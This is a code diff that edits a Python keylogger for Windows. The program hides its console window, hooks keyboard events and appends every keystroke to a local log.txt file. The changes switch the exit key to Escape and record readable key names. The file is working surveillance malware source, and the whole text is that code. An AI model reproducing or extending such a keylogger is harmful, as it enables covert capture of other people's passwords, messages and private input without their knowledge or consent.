@@ -12,18 +12,27 @@ win32gui.ShowWindow(win, 0)
 
 
 def OnKeyboardEvent(event):
-    if event.Ascii == 5:
-        _exit(1)
+    
+    if str(event.Key) == 'Escape':
+        exit(1)
     if event.Ascii != 0 or 8:
-        #open output.txt to read current keystrokes
-        f = open('.\log.txt', 'r+')
+        #open output.txt to read current keystrokes'
+        log = 'log.txt'
+        f = open(str(log), 'r+')
         buffer = f.read()
         f.close()
     # open output.txt to write current + new keystrokes
-        f = open('.\log.txt', 'w')
-        keylogs = chr(event.Ascii)
-        if event.Ascii == 13:
+        f = open(str(log), 'w')
+        print(event.Key)
+        keylogs = str(event.Key)
+        if len(keylogs) > 1:
+            keylogs = ' ' + keylogs + ' '
+        if event.Key == 'Return':
             keylogs = '\n'
+        if event.Key == 'Oem_Period':
+            keylogs = '.'
+        if event.Key == 'Oem_Comma':
+            keylogs = ','
         buffer += keylogs
         f.write(buffer)
         f.close()
